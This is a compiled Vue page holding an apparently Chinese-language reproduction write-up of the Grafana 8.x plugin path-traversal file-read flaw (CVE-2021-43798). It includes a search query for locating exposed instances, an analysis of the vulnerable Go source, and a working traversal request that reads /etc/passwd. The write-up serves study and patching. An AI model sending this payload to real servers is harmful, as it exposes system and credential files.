import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Grafana存在任意文件读取漏洞，通过默认存在的插件，可构造特殊的请求包读取服务器任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Grafana 8.x
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Grafana_Labs-公司产品&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241455924.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>下载源码进行本地分析</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://codeload.github.com/grafana/grafana/zip/refs/tags/v8.3.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>根据漏洞找到 api.go 中的请求路径</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241456202.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>r.Get(&quot;/public/plugins/:pluginId/*&quot;, hs.getPluginAssets)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>跟踪对应的 getPluginAssets 方法</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241456015.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>从请求路径中获取 <code>/public/plugins/</code> 后的参数赋值给 <code>pluginID,</code> 然后再被拼接至 <code>pluginFilePath</code> 进入文件读取片段</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>requestedFile := filepath.Clean(web.Params(c.Req)[&quot;*&quot;])
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241456301.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>也就是说通过默认存在的插件来拼接文件路径构造请求进行文件读取</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)
if !exists {
		c.JsonApiErr(404, &quot;Plugin not found&quot;, nil)
		return
	}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>插件路径 <code>public/app/plugins/panel</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241456061.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/public/plugins/welcome/../../../../../../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241456571.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,26),l=[d];function s(r,c){return a(),i("div",null,l)}const o=e(t,[["render",s],["__file","Grafana plugins 任意文件读取漏洞 CVE-2021-43798.html.vue"]]);export{o as default};
